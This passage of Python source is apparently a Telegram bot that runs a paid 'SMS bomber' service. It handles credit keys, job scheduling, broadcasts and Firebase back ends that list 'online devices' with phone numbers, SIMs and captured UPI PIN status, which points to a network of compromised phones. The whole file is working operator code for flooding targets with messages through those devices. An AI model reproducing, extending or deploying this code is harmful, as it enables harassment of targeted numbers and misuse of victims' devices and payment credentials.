                await update.message.reply_text(f"{T_CROSS} Invalid format.", parse_mode=ParseMode.HTML)
                return SCHEDULE

        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        target = context.user_data["target"]
        message = context.user_data["message"]
        count = context.user_data["sms_count"]
        delay = context.user_data["delay"]

        if get_user_credits(user_id) < count:
            await update.message.reply_text(f"{T_CROSS} Insufficient credits.", parse_mode=ParseMode.HTML)
            return ConversationHandler.END

        firebases = db_get_firebases()
        if not firebases:
            await update.message.reply_text(f"{T_CROSS} No Firebase configured.", parse_mode=ParseMode.HTML)
            return ConversationHandler.END

        fb_ids = list(firebases.keys())
        job_id = str(uuid4())[:8]
        db_add_job(job_id, target, message, fb_ids, chat_id, count, delay, user_id)
        task = asyncio.create_task(execute_bomb_job(job_id, target, message, fb_ids, count, delay, user_id, schedule_time))
        running_jobs[job_id] = task

        schedule_msg = f"⏰ <b>Scheduled:</b> <code>{schedule_time.strftime('%Y-%m-%d %H:%M')}</code>" if schedule_time else f"🚀 <b>Running now...</b>"
        await update.message.reply_text(
            "╭━━━━━━━━━━━━━━━━━━╮\n"
            f"   {T_TICK} <b>BOMB LAUNCHED!</b> {T_TICK}\n"
            "╰━━━━━━━━━━━━━━━━━━╯\n\n"
            f"{T_BOOKMARK} <b>Job ID:</b> <code>{job_id}</code>\n"
            f"{T_PIN} <b>Target:</b> <code>{target}</code>\n"
            f"{T_MSG} <b>Count:</b> {count} | {T_BOLT} <b>Speed:</b> {delay}s\n"
            f"{schedule_msg}\n\n"
            f"{T_STATS} Progress will appear here ✨",
            parse_mode=ParseMode.HTML
        )
        context.user_data.clear()
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"bomb_schedule: {e}")
        await update.message.reply_text(f"{T_CROSS} An error occurred: {str(e)}", parse_mode=ParseMode.HTML)
        return ConversationHandler.END


async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"{T_CROSS} Operation cancelled.", parse_mode=ParseMode.HTML)
    return ConversationHandler.END


# ---------- COMMANDS ----------
async def quick_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(f"{T_MSG} Usage: <code>/bomb &lt;target&gt; &lt;message&gt;</code>", parse_mode=ParseMode.HTML)
        return
    target = args[0]
    message = " ".join(args[1:])
    count = min(10, get_user_credits(user_id))
    if count == 0:
        await update.message.reply_text(f"{T_CROSS} You have no credits.", parse_mode=ParseMode.HTML)
        return
    firebases = db_get_firebases()
    if not firebases:
        await update.message.reply_text(f"{T_CROSS} No Firebase configured.", parse_mode=ParseMode.HTML)
        return
    fb_ids = list(firebases.keys())
    chat_id = update.effective_chat.id
    job_id = str(uuid4())[:8]
    db_add_job(job_id, target, message, fb_ids, chat_id, count, 0.1, user_id)
    task = asyncio.create_task(execute_bomb_job(job_id, target, message, fb_ids, count, 0.1, user_id, None))
    running_jobs[job_id] = task
    await update.message.reply_text(
        f"{T_TICK} <b>QUICK BOMB LAUNCHED!</b>\n{LINE}\n"
        f"{T_BOOKMARK} Job ID: <code>{job_id}</code>\n"
        f"{T_STATS} Progress will show here.",
        parse_mode=ParseMode.HTML
    )


async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = get_user_credits(user_id)
    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_MONEY} <b>PREMIUM VAULT</b> {T_MONEY}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_HEART_P} <b>Balance:</b> {credits} credits\n"
        f"{T_SPARKLES} 1 SMS = 1 credit"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text(f"{T_MSG} Usage: /redeem &lt;key&gt;", parse_mode=ParseMode.HTML)
        return
    key = args[0].strip()
    if db_redeem_key(key, user_id):
        credits = get_user_credits(user_id)
        await update.message.reply_text(
            f"{T_TICK} Key redeemed!\n{T_HEART_P} You now have <b>{credits}</b> credits.",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(f"{T_CROSS} Invalid key or expired.", parse_mode=ParseMode.HTML)


async def addkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} Unauthorized.", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(f"{T_MSG} Usage: /addkey &lt;credits&gt; &lt;max_uses&gt;", parse_mode=ParseMode.HTML); return
    try:
        credits = int(args[0]); max_uses = int(args[1])
        if credits <= 0 or max_uses <= 0: raise ValueError
    except:
        await update.message.reply_text(f"{T_CROSS} Invalid values.", parse_mode=ParseMode.HTML); return
    key_string = generate_key_string()
    db_add_key(key_string, credits, max_uses, user_id)
    await update.message.reply_text(
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_CHECKBOX} <b>KEY GENERATED</b> {T_CHECKBOX}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_STAR} Key: <code>{key_string}</code>\n"
        f"{T_HEART_P} Credits: {credits}\n"
        f"{T_REFRESH} Max uses: {max_uses}\n"
        f"{T_CROWN} Owner: {OWNER}",
        parse_mode=ParseMode.HTML
    )


async def addcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} Unauthorized.", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(f"{T_MSG} Usage: /addcredits &lt;user_id&gt; &lt;amount&gt;", parse_mode=ParseMode.HTML); return
    try:
        target_user = int(args[0]); amount = int(args[1])
        if amount <= 0: raise ValueError
    except:
        await update.message.reply_text(f"{T_CROSS} Invalid input.", parse_mode=ParseMode.HTML); return
    update_user_credits(target_user, amount)
    await update.message.reply_text(f"{T_TICK} Added <b>{amount}</b> credits to <code>{target_user}</code>.", parse_mode=ParseMode.HTML)


async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    jobs = db_get_jobs(limit=10, user_id=user_id)
    if not jobs:
        await update.message.reply_text(f"{T_FILE} No jobs found yet.", parse_mode=ParseMode.HTML); return
    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_BOOKMARK} <b>PREMIUM HISTORY</b> {T_BOOKMARK}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
    )
    for j in jobs:
        status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌", "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
        text += f"{status_emoji} <code>{j['id']}</code> → {j['target']} ({j['status']})\n"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def cancel_job_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text(f"{T_MSG} Usage: /cancel &lt;job_id&gt;", parse_mode=ParseMode.HTML); return
    job_id = args[0]
    if job_id in running_jobs:
        running_jobs[job_id].cancel(); del running_jobs[job_id]
        db_update_job(job_id, status="cancelled", finished_at=datetime.now().isoformat())
        await update.message.reply_text(f"{T_TICK} Job {job_id} cancelled.", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f"{T_CROSS} Job not running.", parse_mode=ParseMode.HTML)


async def add_firebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} Unauthorized.", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(f"{T_MSG} Usage: <code>/addfb &lt;url&gt;</code>", parse_mode=ParseMode.HTML); return
    url = args[0].strip()
    if not url.startswith("http"):
        await update.message.reply_text(f"{T_CROSS} Invalid URL.", parse_mode=ParseMode.HTML); return
    test = await firebase_request(url + "?shallow=true", "GET")
    if isinstance(test, dict) and test.get("_error"):
        status = test.get("status", 0); msg = test.get("message", "Unknown error")
        await update.message.reply_text(f"{T_CROSS} Connection failed (HTTP {status}).\n{T_WARN} {msg}", parse_mode=ParseMode.HTML)
        return
    fid = str(len(db_get_firebases()) + 1)
    db_add_firebase(fid, url, "")
    await update.message.reply_text(f"{T_TICK} Firebase added! ID: <code>{fid}</code>", parse_mode=ParseMode.HTML)


async def delete_firebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} Unauthorized.", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(f"{T_MSG} Usage: /deletefb &lt;id&gt;", parse_mode=ParseMode.HTML); return
    fid = args[0].strip()
    if fid not in db_get_firebases():
        await update.message.reply_text(f"{T_CROSS} Firebase {fid} not found.", parse_mode=ParseMode.HTML); return
    db_delete_firebase(fid)
    await update.message.reply_text(f"{T_TICK} Firebase {fid} deleted.", parse_mode=ParseMode.HTML)


async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} Unauthorized.", parse_mode=ParseMode.HTML); return
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT user_id FROM users"); rows = c.fetchall(); conn.close()
    user_ids = [row[0] for row in rows]
    if not user_ids:
        await update.message.reply_text(f"{T_WARN} No users found.", parse_mode=ParseMode.HTML); return

    photo = None; caption = None
    if update.message.photo:
        photo = update.message.photo[-1].file_id
        caption = update.message.caption or ""
    else:
        if context.args: caption = " ".join(context.args)
        else:
            await update.message.reply_text(f"{T_MSG} Usage: /broadcast &lt;message&gt;", parse_mode=ParseMode.HTML); return
    if not caption and not photo:
        await update.message.reply_text(f"{T_WARN} Empty message.", parse_mode=ParseMode.HTML); return

    sent_count = 0; fail_count = 0
    for uid in user_ids:
        try:
            if photo:
                await BOT.send_photo(chat_id=uid, photo=photo, caption=caption, parse_mode=ParseMode.HTML)
            else:
                await BOT.send_message(chat_id=uid, text=caption, parse_mode=ParseMode.HTML)
            sent_count += 1; await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"broadcast {uid}: {e}"); fail_count += 1
    await update.message.reply_text(
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_MEGA} <b>BROADCAST DONE</b> {T_MEGA}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_TICK} Delivered: {sent_count}\n"
        f"{T_CROSS} Failed: {fail_count}\n"
        f"{T_CROWN} Owner: {OWNER}",
        parse_mode=ParseMode.HTML
    )


# ---------- REPLY KEYBOARD BUTTON HANDLER ----------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id

    if text not in ["/start", "/ping"]:
        joined, missing = await check_channel_membership(user_id, context.bot)
        if not joined:
            ch_list = "\n".join([f"• {ch}" for ch in missing])
            await update.message.reply_text(
                f"{T_WARN} <b>Please join all channels to use this bot!</b>\n\nMissing:\n{ch_list}\n\n"
                f"{T_CROWN} Owner: {OWNER}",
                reply_markup=get_join_keyboard(),
                parse_mode=ParseMode.HTML,
            )
            return

    if context.user_data.get("awaiting_redeem"):
        key = text.strip()
        if db_redeem_key(key, user_id):
            credits = get_user_credits(user_id)
            await update.message.reply_text(
                f"{T_TICK} <b>KEY REDEEMED!</b>\n"
                f"{T_HEART_P} You now have <b>{credits}</b> credits.",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(f"{T_CROSS} Invalid key.", parse_mode=ParseMode.HTML)
        context.user_data.pop("awaiting_redeem", None)
        return

    if text == BTN_LAUNCH_BOMB:
        await bomb_wizard_start(update, context)
    elif text == BTN_BALANCE:
        await balance_command(update, context)
    elif text == BTN_STATUS:
        jobs = db_get_jobs(limit=10, user_id=user_id)
        if not jobs:
            await update.message.reply_text(f"{T_STATS} No jobs yet.", parse_mode=ParseMode.HTML); return
        out = (
            "╭━━━━━━━━━━━━━━━━━━╮\n"
            f"   {T_STATS} <b>STATUS REPORT</b> {T_STATS}\n"
            "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        )
        for j in jobs:
            se = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌", "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
            out += (
                f"{se} <b>Job:</b> <code>{j['id']}</code>\n"
                f"   {T_PIN} Target: <code>{j['target']}</code>\n"
                f"   {T_MSG} Total: {j.get('total_sms',0)} | {T_TICK} {j.get('success_count',0)} | {T_CROSS} {j.get('fail_count',0)}\n"
                f"   {T_HEART_P} Cost: {j.get('credit_used',0)} | 🕒 {j['created_at'][:16]}\n"
                f"   {T_SPARKLES} {j['status']}\n"
                f"   {LINE_THIN}\n"
            )
        await update.message.reply_text(out, parse_mode=ParseMode.HTML)
    elif text == BTN_HISTORY:
        await history_command(update, context)
    elif text == BTN_REDEEM_KEY:
        context.user_data["awaiting_redeem"] = True
        await update.message.reply_text(
            f"{T_CHECKBOX} <b>REDEEM KEY</b>\n\n"
            f"{T_MSG} Please send the key.\n"
            f"{T_PIN} Example: <code>ABCD1234</code>",
            parse_mode=ParseMode.HTML
        )
    elif text == BTN_ONLINE_DEV and user_id in ADMIN_IDS:
        await show_devices_msg(update)
    elif text == BTN_STATS_HIST and user_id in ADMIN_IDS:
        await show_stats_msg(update)
    elif text == BTN_MANAGE_FB and user_id in ADMIN_IDS:
        await manage_fb_msg(update)
    elif text == BTN_GEN_KEY and user_id in ADMIN_IDS:
        await update.message.reply_text(
            f"{T_CHECKBOX} <b>GENERATE KEY</b>\n\n"
            f"{T_MSG} Use: <code>/addkey &lt;credits&gt; &lt;max_uses&gt;</code>",
            parse_mode=ParseMode.HTML
        )
    else:
        pass


async def show_devices_msg(update):
    firebases = db_get_firebases()
    if not firebases:
        await update.message.reply_text(f"{T_WARN} No Firebase configured.", parse_mode=ParseMode.HTML); return
    all_devices = []
    for fid, data in firebases.items():
        devices = await get_online_devices(data["url"])
        for d in devices:
            d["fb_id"] = fid
            all_devices.append(d)
    if not all_devices:
        await update.message.reply_text(f"{T_WARN} No online devices.", parse_mode=ParseMode.HTML); return
    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_BOLT} <b>ONLINE DEVICES</b> {T_BOLT}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
    )
    for d in all_devices:
        try:
            bv = int(d['battery'].replace('%', '')) if d['battery'] != 'N/A' else 0
        except: bv = 0
        bi = "🔋" if bv > 30 else "🪫"
        text += (
            f"{T_PIN} <b>{d['name']}</b> (FB: {d['fb_id']})\n"
            f"{T_STAR} ID: <code>{d['id']}</code>\n"
            f"{T_MSG} {d['phone']}\n"
            f"{bi} {d['battery']} | {len(d['sims'])} SIM(s)\n"
            f"{T_SHIELD} UPI PIN: {'✅' if d.get('upipin') else '❌'}\n"
            f"{LINE_THIN}\n"
        )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def show_stats_msg(update):
    jobs = db_get_jobs(limit=10)
    total_jobs = len(jobs)
    completed = sum(1 for j in jobs if j["status"] == "completed")
    total_sent = sum(j.get("success_count", 0) for j in jobs)
    total_fail = sum(j.get("fail_count", 0) for j in jobs)
    rate = round(total_sent / (total_sent + total_fail) * 100) if (total_sent + total_fail) > 0 else 0
    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_STATS} <b>STATISTICS</b> {T_STATS}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_FILE} Total Jobs: {total_jobs}\n"
        f"{T_TICK} Completed: {completed}\n"
        f"{T_MSG} Total SMS: {total_sent}\n"
        f"{T_SPARKLES} Success Rate: {rate}%\n\n"
    )
    for j in jobs[:5]:
        se = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌", "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
        text += f"{se} <code>{j['id'][:8]}</code> → {j['target']} ({j['status']})\n"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def manage_fb_msg(update):
    firebases = db_get_firebases()
    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_GEAR} <b>MANAGE FIREBASES</b> {T_GEAR}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
    )
    if not firebases:
        text += f"{T_WARN} No Firebase saved.\n"
    else:
        for fid, data in firebases.items():
            text += f"{T_STAR} <b>{fid}</b>: <code>{data['url']}</code>\n"
    text += f"\n{T_MSG} Use /addfb or /deletefb"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


# ---------- MAIN ----------
def main():
    global BOT

    try:
        app = Application.builder().token(TOKEN).concurrent_updates(True).build()
        BOT = app.bot
        set_bot(BOT)

        conv_handler = ConversationHandler(
            entry_points=[
                CommandHandler("bomb", bomb_wizard_start),
                MessageHandler(filters.Regex(f'^{re.escape(BTN_LAUNCH_BOMB)}$'), bomb_wizard_start),
            ],
            states={
                TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_target)],
                MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_message)],
                SMS_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_sms_count)],
                SPEED: [CallbackQueryHandler(bomb_speed, pattern="^speed_(slow|medium|fast|lightning)$")],
                SCHEDULE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_schedule)],
            },
            fallbacks=[CommandHandler("cancel", cancel_conversation)],
            allow_reentry=True,
        )
        app.add_handler(conv_handler)
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, button_handler))

        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("ping", ping))
        app.add_handler(CommandHandler("balance", balance_command))
        app.add_handler(CommandHandler("redeem", redeem_command))
        app.add_handler(CommandHandler("addkey", addkey_command))
        app.add_handler(CommandHandler("addcredits", addcredits_command))
        app.add_handler(CommandHandler("history", history_command))
        app.add_handler(CommandHandler("cancel", cancel_job_command))
        app.add_handler(CommandHandler("addfb", add_firebase_command))
        app.add_handler(CommandHandler("deletefb", delete_firebase_command))
        app.add_handler(CommandHandler("broadcast", broadcast_command))
        app.add_handler(CommandHandler("bomb", quick_bomb))

        app.add_handler(CallbackQueryHandler(callback_handler, pattern="^check_join$"))

        logger.info("Premium Bomber Bot (Colored Reply Keyboard) started.")
        app.run_polling(drop_pending_updates=True)

    except Exception as e:
        logger.error(f"❌ Failed to start: {e}")
        print(f"\n❌ ERROR: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()